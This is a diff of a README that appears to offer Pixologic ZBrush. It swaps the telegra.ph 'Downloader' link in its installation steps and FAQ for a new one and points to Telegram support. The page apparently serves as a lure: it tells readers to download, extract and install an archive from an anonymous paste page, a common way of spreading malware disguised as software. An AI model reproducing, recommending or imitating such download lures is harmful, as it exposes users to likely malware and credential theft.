@@ -23,7 +23,7 @@ Dynamics. Pixologic ZBrush introduces a dynamics system that allows any surface 
 ✔️ 24/7 Support – Always here to help
 
 ## Installation 🛠
-1. Download the archive  [here](https://telegra.ph/Downloader-2025-03-08-2). 📥
+1. Download the archive  [here](https://telegra.ph/Downloader-2025-03-14). 📥
 2. Extract the archive and follow the installation instructions. 📂
 3. After installation, launch the application. 🚀
 
@@ -38,7 +38,7 @@ here
 # Frequently Asked Questions (FAQ) ❓
 
 - How do I install the program? 🤔
-- You can install the archive from  [here](https://telegra.ph/Downloader-2025-03-08-2)
+- You can install the archive from  [here](https://telegra.ph/Downloader-2025-03-14)
 
 - How can I get support? 💬
 - Out TG Support [Support](@MBNSupport)
